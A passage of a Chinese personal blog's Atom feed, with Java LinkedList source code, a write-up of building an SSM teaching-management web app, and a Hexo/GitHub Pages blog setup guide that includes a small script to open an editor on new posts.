class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPrevious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">previous</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasPrevious())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line"></span><br><span class="line">            lastReturned = next = (next == <span class="keyword">null</span>) ? last : next.prev;</span><br><span class="line">            nextIndex--;</span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">nextIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">previousIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line"></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; lastNext = lastReturned.next;</span><br><span class="line">            unlink(lastReturned);</span><br><span class="line">            <span class="keyword">if</span> (next == lastReturned)</span><br><span class="line">                next = lastNext;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextIndex--;</span><br><span class="line">            lastReturned = <span class="keyword">null</span>;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned.item = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">                linkLast(e);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                linkBefore(e, next);</span><br><span class="line">            nextIndex++;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">private</span> java.util.<span class="function">LinkedList&lt;E&gt; <span class="title">superClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (java.util.LinkedList&lt;E&gt;) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.util.LinkedList&lt;E&gt; clone = superClone();</span><br><span class="line">        clone.first = clone.last = <span class="keyword">null</span>;</span><br><span class="line">        clone.size = <span class="number">0</span>;</span><br><span class="line">        clone.modCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            clone.add(x.item);</span><br><span class="line">        <span class="keyword">return</span> clone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        Object[] result = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            result[i++] = x.item;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T[] toArray(T[] a) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a.length &lt; size)</span><br><span class="line">            a = (T[])java.lang.reflect.Array.newInstance(</span><br><span class="line">                    a.getClass().getComponentType(), size);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        Object[] result = a;</span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            result[i++] = x.item;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a.length &gt; size)</span><br><span class="line">            a[size] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">876323262645176354L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        s.writeInt(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next)</span><br><span class="line">            s.writeObject(x.item);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> size = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            linkLast((E)s.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/Java-Collection-sourcecode/Collection.jpg&quot; alt=&quot;Collection&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
    <category term="源码" scheme="https://www.fvolcano.red/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>教学管理系统web应用+SSM搭建记录</title>
    <link href="https://www.fvolcano.red/2020/InfoManageSystem-webApplication-setUp-record/"/>
    <id>https://www.fvolcano.red/2020/InfoManageSystem-webApplication-setUp-record/</id>
    <published>2020-08-16T07:23:11.000Z</published>
    <updated>2020-08-16T07:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E9%A6%96%E9%A1%B5.png"></p><p>从一份JavaWeb的作业开始不断改进。最终效果：实现了角色分工、信息增删改查、html+css界面，SSM整合。应该是我第一个用上了SSM的项目，边学边整合。<a id="more"></a></p><h1 id="项目初期"><a href="#项目初期" class="headerlink" title="项目初期"></a>项目初期</h1><p>刚准备开始做时的搭建计划：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E6%80%BB%E4%BD%93%E8%AE%A1%E5%88%92.png" alt="总体计划"></p><p>做了八天，其中整合界面（html+css）就花了一两天。从前端网站找的页面，整合过程中除了许许多多小问题，因为自己对于css和html也不是很熟悉，只处于看懂的水平，所以各种微调花了不少时间。</p><p>其中比较值得记录的应该就是抽取出来的<strong>分页功能</strong>：（后面MyBatis的PageHelper已经能够实现这个功能了）</p><h3 id="分页功能"><a href="#分页功能" class="headerlink" title="分页功能"></a>分页功能</h3><p>未完待续。</p><h1 id="SSM整合"><a href="#SSM整合" class="headerlink" title="SSM整合"></a>SSM整合</h1><h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><ol><li><p>使用IoC容器管理DataSource对象</p></li><li><p>依赖注入方式</p></li><li><p>@controller注解与tomcat管理servlet冲突</p><p>（这时还没有学SpringMVC，仍然用的servlet。）因此也不能加@Autowared标签。转而在WebUtils中实现从ioc容器中获取bean对象的方法。</p></li><li><p>开启事务</p></li></ol><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><ol><li>负责管理controller和视图层</li><li>配置中央分发器</li><li>改造所有servelt，以String的形式返回页面</li></ol><h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><ol><li>去除DAO的实现类，直接为DAO接口写相应的sql语句</li><li>动态sql实现更加强大的功能</li><li>数据库字段与JavaBean属性的对应问题解决</li><li>MyBatis的代码生成器</li><li>PageHelper帮助实现分页功能</li></ol><p><strong>总结：</strong></p><ol><li><p>遇到的最大的问题？</p><p>因为这个项目功能很简单，虽然经常也会遇到配置错误等等各种小问题，但上网搜索后一般都能够解决。所以在其中遇到的最大的困难应该就是导包了，没有Maven真的很难，特别是不知道依赖些什么包，导入的过程中因为版本等原因错误不断。</p></li><li><p>如何解决这个问题的？</p><p>首先上网搜索，无果后找SSM的项目视频，看别人导了一些什么包，之后去找包。</p></li><li><p>第一次使用SSM的感受？</p><p>因为这个项目确实很小，对于这三个框架提供的便利性并没有太深的感受。但对于他们提供的功能有了初步的认识了。比如Spring的IoC、DI自动注入、动态代理和AOP思想；SpringMVC的ModelAndView、前端控制器、拦截器和后端验证、上传下载；MyBatis的简化的DAO开发、动态sql、延迟加载和缓存机制等等。</p></li></ol><h1 id="展示效果"><a href="#展示效果" class="headerlink" title="展示效果"></a>展示效果</h1><p><strong>管理员</strong>身份：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/1.jpg" alt="登录"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/2.jpg" alt="登陆失败"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/3.jpg" alt="登陆成功，进入主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/4.jpg" alt="点击课程信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/5.jpg" alt="实现分页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/6.jpg" alt="点击添加课程"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/7.jpg" alt="点击修改"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/8.jpg" alt="点击删除"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/9.jpg" alt="点击学生信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/10.jpg" alt="修改"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/11.jpg" alt="点击查看成绩"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/12.jpg" alt="点击添加学生"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/13.jpg" alt="点击教师信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/14.jpg" alt="添加"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/15.jpg" alt="点击修改密码"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/16.jpg" alt="修改密码后跳至登陆界面"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/17.jpg" alt="退出后（之前有选择“记住我”）"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/18.jpg" alt="注销登录信息后"></p><p><strong>学生</strong>身份登录：</p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/19.jpg" alt="学生主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/20.jpg" alt="选课"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/21.jpg" alt="提示信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/22.jpg" alt="提示信息"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/23.jpg" alt="点击查看成绩"></p><p>（其余功能与管理员相同）</p><p><strong>教师</strong>身份登录：<br> <img src="/2020/InfoManageSystem-webApplication-setUp-record/24.jpg" alt="教师主页"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/25.jpg" alt="点击录入成绩"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/26.jpg" alt="选择某一学生"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/27.jpg" alt="点击录入"></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/28.jpg" alt="录入后"></p><p>（其余功能与管理员相同）</p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="项目路径问题"><a href="#项目路径问题" class="headerlink" title="项目路径问题"></a>项目路径问题</h2><p>在Idea中修改Context（项目上下文路径）比较简单，只需要在Tomcat中配置一下就好了；但转到eclipse后，需要在server.xml中修改。</p><p>将path修改成你想要访问的项目根路径。</p><p>按下图修改后，访问路径变为 <a href="http://localhost:8080/">http://localhost:8080/</a></p><p><img src="/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E4%BF%AE%E6%94%B9.png" alt="项目路径修改"></p><h2 id="bean对象无法自动注入"><a href="#bean对象无法自动注入" class="headerlink" title="bean对象无法自动注入"></a>bean对象无法自动注入</h2><p>我在某一个JavaBean中使用了@Autowired注解，却没有将该类加入ioc容器，自然就报空指针异常了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2020/InfoManageSystem-webApplication-setUp-record/%E9%A1%B9%E7%9B%AE%E9%A6%96%E9%A1%B5.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;从一份JavaWeb的作业开始不断改进。最终效果：实现了角色分工、信息增删改查、html+css界面，SSM整合。应该是我第一个用上了SSM的项目，边学边整合。&lt;/p&gt;</summary>
    
    
    
    <category term="SSM" scheme="https://www.fvolcano.red/categories/SSM/"/>
    
    <category term="JavaWeb" scheme="https://www.fvolcano.red/categories/JavaWeb/"/>
    
    
    <category term="项目" scheme="https://www.fvolcano.red/tags/%E9%A1%B9%E7%9B%AE/"/>
    
    <category term="记录" scheme="https://www.fvolcano.red/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Hexo + GitHub Pages 博客搭建记录</title>
    <link href="https://www.fvolcano.red/2020/hexo-githubPages-setUp-record/"/>
    <id>https://www.fvolcano.red/2020/hexo-githubPages-setUp-record/</id>
    <published>2020-08-15T12:57:26.000Z</published>
    <updated>2020-08-15T12:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>很早就有建一个自己的博客网站的想法了，可能也是想可以倒逼自己多写点东西吧。从安装hexo开始、更换主题、添加功能和第三方服务、部署到github pages上，一步步完善自己的博客。期间踩到了数不清的坑，历时一个月，终于把博客的雏形给做出来了。    <a id="more"></a></p><h1 id="搭建框架与部署"><a href="#搭建框架与部署" class="headerlink" title="搭建框架与部署"></a>搭建框架与部署</h1><p>参考 <a href="https://www.bilibili.com/video/BV1Yb411a7ty?from=search&seid=2359438930998851478">手把手教你从0开始搭建自己的个人博客 |无坑版视频教程| hexo</a>。</p><h1 id="Hexo-配置"><a href="#Hexo-配置" class="headerlink" title="Hexo 配置"></a>Hexo 配置</h1><h2 id="分类方法"><a href="#分类方法" class="headerlink" title="分类方法"></a>分类方法</h2><p>参考 <a href="https://hexo.io/zh-cn/docs/front-matter">hexo中文文档</a>。</p><p>在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p><p>WordPress 支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是 Hexo 不支持指定多个同级分类。下面的指定方法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">  -</span> Diary</span><br><span class="line"><span class="bullet">  -</span> Life</span><br></pre></td></tr></table></figure><p>会使分类<code>Life</code>成为<code>Diary</code>的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</p><p>如果你需要为文章添加多个分类，可以尝试以下 list 中的方法。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">- </span>[Diary, PlayStation]</span><br><span class="line"><span class="bullet">- </span>[Diary, Games]</span><br><span class="line"><span class="bullet">- </span>[Life]</span><br></pre></td></tr></table></figure><p>此时这篇文章同时包括三个分类： <code>PlayStation</code> 和 <code>Games</code> 分别都是父分类 <code>Diary</code> 的子分类，同时 <code>Life</code> 是一个没有子分类的分类。</p><h2 id="相对路径引用的标签"><a href="#相对路径引用的标签" class="headerlink" title="相对路径引用的标签"></a>相对路径引用的标签</h2><p>通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。</p><p>正确的引用图片方式是使用下列的标签插件而不是 markdown ：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">example</span>.jpg This <span class="built_in">is</span> an <span class="built_in">example</span> <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure><p>通过这种方式，图片将会同时出现在文章和主页以及归档页中。</p><h2 id="URL-中的分类和标签「翻译」成英文"><a href="#URL-中的分类和标签「翻译」成英文" class="headerlink" title="URL 中的分类和标签「翻译」成英文"></a>URL 中的分类和标签「翻译」成英文</h2><p>参考 <a href="https://github.com/hexojs/hexo/issues/1162">hexo issues</a>。</p><p>在<code>_config.yml</code>的<code># Category &amp; Tag</code>一项下面的<code>tag_map</code>和<code>category_map</code>下面这样配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line">    <span class="string">Linux操作系统:</span> <span class="string">Linux-OS</span></span><br><span class="line">    <span class="string">中文分类:</span> <span class="string">英文分类</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line">    <span class="string">中文标签:</span> <span class="string">英文标签</span></span><br></pre></td></tr></table></figure><h2 id="添加网站图标"><a href="#添加网站图标" class="headerlink" title="添加网站图标"></a>添加网站图标</h2><ol><li><p>选择好自己的图标，没有的话可以去 <a href="https://www.iconfont.cn/">阿里巴巴矢量图标库</a> 挑一个。</p></li><li><p>将下载的图片在 <a href="https://www.websiteplanet.com/zh-hans/webtools/favicon-generator/">网站图标生成</a> 上转换格式。</p></li><li><p>把它放入主题文件夹下面的 source/images/ 下面</p></li><li><p>在主题配置文件中修改</p></li></ol><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-24_20-22-36.png" alt="修改favicon配置"></p><h2 id="更改文章url为英文"><a href="#更改文章url为英文" class="headerlink" title="更改文章url为英文"></a>更改文章url为英文</h2><p>在站点的<code>_config.yml</code>中，生成的文章链接默认为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure><ol><li><p>将<code>/:title/</code>替换为<code>/:urlname/</code></p></li><li><p>更改<code>permalink_defaults</code></p></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line">  <span class="attr">urlname:</span> <span class="string">index</span></span><br></pre></td></tr></table></figure><ol start="3"><li>之后写文章时在font-matter处加上<code>urlname: XXX</code>就可以了</li></ol><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-09-06_10-31-34.png" alt="urlname"></p><p>还可以在<code>scaffolds/post.md</code>里配上这个字段</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-09-06_10-33-53.png" alt="添加创建模板字段"></p><p>这样，以后<code>hexo n post &quot;&quot;</code>的时候就自动出现在font-matter里面了。</p><p><code>！</code>注意：以前的文章也需要加上urlname字段，内容与文章标题保持一致，否则就找不到了噢。（或者你也可以选择全部重建）</p><h1 id="添加小功能"><a href="#添加小功能" class="headerlink" title="添加小功能"></a>添加小功能</h1><h2 id="添加文章时自动打开编辑器"><a href="#添加文章时自动打开编辑器" class="headerlink" title="添加文章时自动打开编辑器"></a>添加文章时自动打开编辑器</h2><p>参考 <a href="%5Bhttps://notes.doublemine.me/2015-06-29-Hexo%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E6%97%B6%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%BC%96%E8%BE%91%E5%99%A8.html%5D(https://notes.doublemine.me/2015-06-29-Hexo%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E6%97%B6%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%BC%96%E8%BE%91%E5%99%A8.html)">Hexo 添加文章时自动打开编辑器 - Doublemine</a> 。以下为博客内容：</p><ul><li>首先在Hexo目录下的<code>scripts</code>目录中创建一个JavaScript脚本文件。</li><li>如果没有这个<code>scripts</code>目录，则新建一个。</li><li><code>scripts</code>目录新建的JavaScript脚本文件可以任意取名。</li></ul><p>通过这个脚本，我们用其来监听<code>hexo new</code>这个动作，并在检测到<code>hexo new</code>之后，执行编辑器打开的命令。</p><p>如果你是windows平台的Hexo用户，则将下列内容写入你的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spawn = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 2.x 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">path</span>)</span>&#123;</span><br><span class="line">  spawn(<span class="string">&#x27;start  &quot;markdown编辑器绝对路径.exe&quot; &#x27;</span> + path);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 3 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  spawn(<span class="string">&#x27;start  &quot;markdown编辑器绝对路径.exe&quot; &#x27;</span> + data.path);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果你是Mac平台Hexo用户，则将下列内容写入你的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hexo 2.x 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">path</span>)</span>&#123;</span><br><span class="line">    exec(<span class="string">&#x27;open -a &quot;markdown编辑器绝对路径.app&quot; &#x27;</span> + path);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Hexo 3 用户复制这段</span></span><br><span class="line">hexo.on(<span class="string">&#x27;new&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    exec(<span class="string">&#x27;open -a &quot;markdown编辑器绝对路径.app&quot; &#x27;</span> + data.path);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>保存并退出脚本之后，在命令行中键入：   </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;auto open editor test&quot;</span><br></pre></td></tr></table></figure><p>就可以打开编辑器了。</p><h2 id="主动推送Hexo博客新链接至搜索平台"><a href="#主动推送Hexo博客新链接至搜索平台" class="headerlink" title="主动推送Hexo博客新链接至搜索平台"></a>主动推送Hexo博客新链接至搜索平台</h2><p>使用插件 hexo-submit-urls-to-search-engine ，查看 <a href="https://cjh0613.com/20200603HexoSubmitUrlsToSearchEngine.html">中文文档</a>。</p><p>首先明确</p><p>1）站点配置文件，位于站点文件夹根目录内<code>~/blog/_config.yml</code></p><p>2）主题配置文件，位于主题文件夹根目录内<code>~/blog/themes/next/_config.yml</code></p><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p>有两个插件我比较喜欢，一个可以<a href="https://github.com/kchen0x/hexo-reference">悬浮显示</a>，一个比较<a href="https://github.com/LouisBarranqueiro/hexo-footnotes">简洁</a> 。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-20_16-18-02.png" alt="hexo两个脚注插件"><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-20_16-18-11.png" alt="悬浮显示" style="zoom:50%;"></p><p><strong>Markdown</strong> 语法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">basic footnote[^1]</span><br><span class="line">here is an inline footnote[<span class="string">^2</span>](<span class="link">inline footnote</span>)</span><br><span class="line">and another one[^3]</span><br><span class="line">and another one[^4]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^1</span>]: <span class="link">basic footnote content</span></span><br><span class="line">[<span class="symbol">^3</span>]: <span class="link">paragraph</span></span><br><span class="line">footnote</span><br><span class="line">content</span><br><span class="line">[<span class="string">^4</span>]: footnote content with some [<span class="string">markdown</span>](<span class="link">https://en.wikipedia.org/wiki/Markdown</span>)</span><br></pre></td></tr></table></figure><h2 id="添加评论系统"><a href="#添加评论系统" class="headerlink" title="添加评论系统"></a>添加评论系统</h2><p><a href="https://www.jianshu.com/p/3e200908b9fc">各种评论系统的比较</a> ，我使用的是 valine。支持Markdown，重点是好看！</p><p>参考 <a href="%5Bhttps://qianfanguojin.github.io/2019/07/23/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%BANext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Valine%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/%5D(https://qianfanguojin.github.io/2019/07/23/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%BANext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Valine%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/)">为Next主题添加Valine评论系统</a> 。</p><p>我这里踩了一个坑，之前在LeanCloud上操作过，不知道是设置了些什么账号出了问题，之后我换了一个节点重新新建一个项目，填入新的appId和appKey后就好了。</p><h1 id="主题美化"><a href="#主题美化" class="headerlink" 